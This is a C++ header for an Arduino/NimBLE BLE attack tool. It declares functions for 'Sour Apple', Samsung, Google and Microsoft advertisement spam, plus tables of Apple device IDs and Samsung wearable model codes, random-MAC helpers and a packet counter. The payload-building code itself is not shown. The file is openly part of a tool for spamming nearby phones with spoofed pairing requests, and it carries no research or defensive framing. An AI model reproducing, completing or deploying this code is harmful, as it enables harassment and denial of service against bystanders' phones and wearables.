#ifndef BLUETOOTH_ATTACKS_H
#define BLUETOOTH_ATTACKS_H

#include <Arduino.h>
#include <NimBLEDevice.h>

// BLE Attack Types
enum BLEAttackType {
    BLE_ATTACK_SOUR_APPLE,
    BLE_ATTACK_SAMSUNG,
    BLE_ATTACK_GOOGLE,
    BLE_ATTACK_MICROSOFT,
    BLE_ATTACK_ALL
};

// Apple Device Types for Sour Apple Attack
enum AppleDeviceType {
    AIRPODS_GEN2 = 0x0220,
    AIRPODS_PRO = 0x0E20,
    AIRPODS_MAX = 0x0A20,
    AIRPODS_GEN3 = 0x1320,
    AIRTAG = 0x0055,
    APPLE_TV = 0x0604,
    HOMEPOD = 0x0602,
    BEATS_SOLO_PRO = 0x0B09,
    BEATS_FLEX = 0x1011,
    POWERBEATS_PRO = 0x0B03
};

class BluetoothAttacks {
public:
    BluetoothAttacks();
    
    // Initialize BLE
    bool begin();
    void end();
    
    // Attack functions
    void startSourApple();
    void startSamsungSpam();
    void startGoogleSpam();
    void startMicrosoftSpam();
    void startSpamAll();
    
    // Stop attack
    void stop();
    
    // Status
    bool isRunning() { return _isRunning; }
    uint32_t getPacketsSent() { return _packetsSent; }
    BLEAttackType getCurrentAttack() { return _currentAttack; }
    
    // Single shot attacks (call repeatedly in loop)
    void executeSourApple();
    void executeSamsungSpam();
    void executeGoogleSpam();
    void executeMicrosoftSpam();
    
private:
    bool _isRunning;
    uint32_t _packetsSent;
    BLEAttackType _currentAttack;
    unsigned long _lastSendTime;
    uint16_t _sendInterval;
    
    NimBLEAdvertising* _pAdvertising;
    
    // Helper functions
    void generateRandomMac(uint8_t* mac);
    void setBaseMacAddress(uint8_t* mac);
    NimBLEAdvertisementData createApplePayload();
    NimBLEAdvertisementData createSamsungPayload();
    NimBLEAdvertisementData createGooglePayload();
    NimBLEAdvertisementData createMicrosoftPayload();
    
    // Apple device models
    const uint16_t _appleDevices[10] = {
        AIRPODS_GEN2,
        AIRPODS_PRO,
        AIRPODS_MAX,
        AIRPODS_GEN3,
        AIRTAG,
        APPLE_TV,
        HOMEPOD,
        BEATS_SOLO_PRO,
        BEATS_FLEX,
        POWERBEATS_PRO
    };
    
    // Samsung watch models
    struct SamsungWatch {
        uint8_t value;
        const char* name;
    };
    
    const SamsungWatch _samsungWatches[25] = {
        {0x01, "Gear S3"},
        {0x02, "Galaxy Watch"},
        {0x03, "Galaxy Watch Active"},
        {0x04, "Galaxy Watch Active 2"},
        {0x05, "Galaxy Watch 3"},
        {0x06, "Galaxy Watch 4"},
        {0x07, "Galaxy Watch 4 Classic"},
        {0x08, "Galaxy Watch 5"},
        {0x09, "Galaxy Watch 5 Pro"},
        {0x0A, "Galaxy Fit"},
        {0x0B, "Galaxy Fit 2"},
        {0x0C, "Galaxy Buds"},
        {0x0D, "Galaxy Buds+"},
        {0x0E, "Galaxy Buds Live"},
        {0x0F, "Galaxy Buds Pro"},
        {0x10, "Galaxy Buds 2"},
        {0x11, "Galaxy Buds 2 Pro"},
        {0x12, "Galaxy Ring"},
        {0x13, "Galaxy SmartTag"},
        {0x14, "Galaxy SmartTag+"},
        {0x15, "Galaxy Fit e"},
        {0x16, "Galaxy Watch FE"},
        {0x17, "Galaxy Buds FE"},
        {0x18, "Galaxy Watch Ultra"},
        {0x19, "Galaxy Buds 3"}
    };
};

// Global instance
extern BluetoothAttacks bleAttacks;

#endif // BLUETOOTH_ATTACKS_H
